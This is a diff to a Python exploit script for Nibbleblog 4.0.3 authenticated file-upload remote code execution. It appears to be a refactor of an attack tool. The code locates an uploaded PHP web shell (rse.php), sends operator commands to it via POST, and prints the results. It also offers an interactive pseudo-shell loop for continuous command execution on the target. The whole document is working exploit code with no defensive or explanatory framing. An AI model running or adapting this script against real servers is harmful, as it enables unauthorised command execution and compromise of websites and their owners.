@@ -40,46 +40,29 @@ class Nibbleblog():
             exit()
 
     def rce(self):
+        requests.packages.urllib3.disable_warnings()
+        url_shell = self.target.replace("/admin.php","/content/private/plugins/my_image/rse.php")
+        print("Payload located in " + url_shell)
         if args.shell:
-            requests.packages.urllib3.disable_warnings()
-            url_shell = self.target.replace("/admin.php","/content/private/plugins/my_image/rse.php")
-            print("Payload located in " + url_shell)
-
             while True:
-                req_url_file_check = requests.get(url_shell,verify=False)
-                if req_url_file_check.status_code != 200:
-                    print("File has been deleted. Re-Uploading file!")
-                    self.upload()
-                    break
-                else:
+                try:
                     cmd = input("RCE: ")
                     
                     rce_data = {
                         'rse':cmd
                     }
                     req_url_rce = requests.post(url_shell,data=rce_data,verify=False)
-                    if req_url_rce.status_code != 200:
-                        print("File has been deleted. Re-Uploading file!")
-                        self.upload()
-                        break
-                    else:
-                        print(req_url_rce.text)
+                    print(req_url_rce.text)
+                except KeyboardInterrupt:
+                    print("Bye Bye\n")
+                    exit()
 
         if args.rce:
-            requests.packages.urllib3.disable_warnings()
-            url_shell = self.target.replace("/admin.php","/content/private/plugins/my_image/rse.php")
-            print("Payload located in " + url_shell)
-
-            req_url_file_check = requests.get(url_shell,verify=False)
-            if req_url_file_check.status_code != 200:
-                print("File has been deleted. Re-Uploading file!")
-                self.upload()
-            else:
-                rce_data = {
-                    'rse':self.cmd
-                }
-                req_url_rce = requests.post(url_shell,data=rce_data,verify=False)
-                print(req_url_rce.text)
+            rce_data = {
+                'rse':self.cmd
+            }
+            req_url_rce = requests.post(url_shell,data=rce_data,verify=False)
+            print(req_url_rce.text)
 
 if __name__ == "__main__":
     print("Nibbleblog 4.0.3 File Upload Authenticated Remote Code Execution")
@@ -88,12 +71,8 @@ if __name__ == "__main__":
     parser.add_argument('-t', metavar='<Target admin URL>', help='admin target/host URL, E.G: http://nibblesrce.com/blog/admin.php', required=True)
     parser.add_argument('-u', metavar='<user>', help='Username', required=True)
     parser.add_argument('-p', metavar='<password>', help="Password", required=True)
-    parser.add_argument('-rce', metavar='<Remote Code Execution>', help='-rce whoami', required=True)
+    parser.add_argument('-rce', metavar='<Remote Code Execution>', help='-rce whoami', required=False)
     parser.add_argument('-shell',action='store_true',help='Pseudo-Shell option for continous rce', required=False)
     args = parser.parse_args()
 
-    try:
-        Nibbleblog(args.t,args.u,args.p,args.rce)
-    except KeyboardInterrupt:
-        print("Bye Bye")
-        exit()
+    Nibbleblog(args.t,args.u,args.p,args.rce)
